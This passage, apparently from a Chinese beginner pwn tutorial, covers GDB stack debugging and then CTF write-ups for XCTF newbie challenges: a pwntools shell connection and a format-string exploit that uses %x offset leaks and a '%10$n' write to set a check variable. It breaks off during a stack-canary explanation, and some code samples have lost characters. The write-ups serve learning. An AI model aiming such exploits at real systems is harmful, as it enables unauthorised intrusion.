我们入门先写一个`hello world`的程序
    #include 
    int hello(int a,int b)
    {
      return a+b;
    }
    int main()
    {
    printf("Hello world!n");
    hello(1, 2);
    return 0;
    }
编译开启调试选项:
    gcc -g -Wall test.c -o test
然后开启我们gdb调试熟悉下程序的执行流程
因为可以源码debug
直接 1.`b main` 2.`run`
我们看下栈段的信息
所以我们可以根据这些信息,画出调用`hello`函数的堆栈图。
我们输入`s`,进入到`hello`函数,先记录下没进去之前的`rbp,rsp`
这里我们按照指令去跟进call: `ni` `si` 两者区别同上
这里我补充下关于函数调用的汇编知识
> ret 指令是退出函数 等价于 pop RIP  
>  call 指令是调用函数 分为两步:(1)将当前的rip压入栈中 (2)转移到函数内  
>  push RIP  
>  jmp x  
>  push ebp 就是把ebp的 **内容** 放入当前栈顶单元的上方  
>  pop ebp 从栈顶单元中取出数据送入ebp寄存器中  
>  RSP 指向栈顶单元,会根据栈大小来动态改变。
我们验证下:
然后`si`跟进
然后我们获取下rbp的内存地址来画堆栈图
这个时候`rbp`值没改变,但是`rsp`改变了
执行完`mov rbp, rsp`
后面就到`return a+b`,这里没有进行开辟栈空间，所以这些操作并没有在当前栈里面。`rbp rsp`指向同一地址
接着执行ret可以看到
RIP的值就是上面那个栈顶的值, 这就验证了ret => pop rip
这里栈没什么空间,所以这里丢个简单的栈图
###  0x4.2 参考链接
[Linux
gcc和gdb程序调试用法](https://blog.csdn.net/chenyiming_1990/article/details/8653900)
[pwn 题GDB调试技巧和exp模板](https://blog.csdn.net/lla520/article/details/77776809)
[【汇编】堆栈和画堆栈图](https://blog.csdn.net/qq_41884002/article/details/81452889)
## 0x5 练习篇
**第一部分我打算从攻防世界的新手区刷起**
###  0x1 get_shell
####  (1) 题目描述及其考点
> 题目描述：运行就能拿到shell呢，真的  
>  考点: 基本的pwntools使用
####  (2) wp
直接hex Fiend查看或者`checksec` 或者用自带的`file x`
可以得知这个程序是64位(x86-64 就是x64)的
我们直接用ida打开,f5一下,可以知道这个题目的确很基础,考察基本的pwn链接。
可以看出来直接system执行了命令行下的输入
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      puts("OK,this time we will get a shell.");
      system("/bin/sh");
      return 0;
    }
那么我们直接写个连接nc的脚本就行了
上面给出了nc的地址: `111.198.29.45:34462`
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import * 
    c = remote("111.198.29.45", 34462)
    c.interactive()
###  0x2 CGfsb
####  (1) 题目描述及其考点
> 题目描述：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用  
>  漏洞点: 格式化字符串
####  (2)wp
[格式化字符串漏洞利用学习](https://www.cnblogs.com/ichunqiu/p/9329387.html)
我们把附件下载下来,直接ida打开。
我们`checksec`查看下
这是32位架构的,直接用ida64打开是没办法反编译的,这里我们选择用32位ida去打开
然后在左边那个`Function name`窗口按下`m`就会匹配以m开头的函数,找到`main`函数,f5反编译
    // 这里我选取了重要代码出来,
      puts("please tell me your name:"); 
      read(0, &buf, 0xAu);
      puts("leave your message please:");
      fgets(&s, 100, stdin);
      printf("hello %s", &buf);
      puts("your message is:");
      printf(&s);// 这里漏洞点
      if ( pwnme == 8 )
      {
        puts("you pwned me, here is your flag:n");
        system("cat flag");
      }
`printf()`的标准格式是: printf(“”,)
首先我们找出偏移量
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    c = remote("111.198.29.45", 53486)
    c.sendlineafter('name:', 'aaa')
    c.sendlineafter('please:', 'AAAA %x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x')
    c.interactive()
`AAAA` 其实就是 `十进制ascii 65->0x41 (16进制)` 这样看起来比较方便。
我们可以看到AAAA 相对于格式化字符串的偏移量是10。
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    c = remote("111.198.29.45", 53486)
    payload = p32(0x0804A068) + '1234' + '%10$n'
    c.sendlineafter('name:', 'aaa')
    c.sendlineafter('please:', payload)
    c.interactive()
这里需要介绍`%n`在格式化字符串中作用
> %n: 将%n 之前printf已经打印的字符个数赋值给格式化字符串对应偏移地址位置。
这里因为要pwnme为8,所以我们构造`p32(0x0804A068) +
'1234'`8个字节,然后`%10$n`进行赋值给`p32(0x0804A068)`地址,从而pwn掉。
###  0x3 when_did_you_born
####  (1)题目描述及其考点
> 只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办  
>  考点: 栈溢出
####  (2) wp
首先看下文件结构:
这里开启了`Canary`保护,也许你现在对此一无所知,但是没关系,看我细细道来。
>
> canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致
那么这句话是什么意思呢,就算你不懂汇编，也没关系，听我一点点地举例子来分析。
我们ida64打开下载下来的elf文件, 左边按m找到main函数，代码如下。
我们挑取代码下来分析下:
    .text:0000000000400826 main            proc near ;               DATA XREF: start+1D↑o
    .text:0000000000400826
    .text:0000000000400826 var_20          = byte ptr -20h
    .text:0000000000400826 var_18          = dword ptr -18h
    .text:0000000000400826 var_8           = qword ptr -8
    .text:0000000000400826
    .text:0000000000400826 ; __unwind {
    .text:0000000000400826                 push    rbp
    .text:0000000000400827                 mov     rbp, rsp
    .text:000000000040082A                 sub     rsp, 20h
    .text:000000000040082E                 mov     rax, fs:28h
    .text:0000000000400837                 mov     [rbp+var_8], rax
    .text:000000000040083B                 xor     eax, eax
    .text:000000000040083D                 mov     rax, cs:stdin
    .text:0000000000400844                 mov     esi, 0          ; buf
    .text:0000000000400849                 mov     rdi, rax        ; stream
    .text:000000000040084C                 call    _setbuf
    .text:0000000000400851                 mov     rax, cs:stdout
    .text:0000000000400858                 mov     esi, 0          ; buf
    .text:000000000040085D                 mov     rdi, rax        ; stream
    .text:0000000000400860                 call    _setbuf
    .text:0000000000400865                 mov     rax, cs:stderr
    .text:000000000040086C                 mov     esi, 0          ; buf
    .text:0000000000400871                 mov     rdi, rax        ; stream
    .text:0000000000400874                 call    _setbuf
    .text:0000000000400879                 mov     edi, offset s   ; "What's Your Birth?"
    .text:000000000040087E                 call    _puts
    .text:0000000000400883                 lea     rax, [rbp+var_20]
    .text:0000000000400887                 add     rax, 8
    .text:000000000040088B                 mov     rsi, rax
    .text:000000000040088E                 mov     edi, offset aD  ; "%d"
    .text:0000000000400893                 mov     eax, 0
    .text:0000000000400898                 call    ___isoc99_scanf
    .text:000000000040089D                 nop
> 补充一些基础的汇编知识点:  
>  ; 分号代表注释
    main            proc near ;   代表main子程序的开始 可以类比为 main(){}中的 main{
    main            endp ;代表main子程序的结束,类比为 main(){} 中的 }
> .text:0000000000400826 var_20 = byte ptr -20h  
>  .text:0000000000400826 var_18 = dword ptr -18h  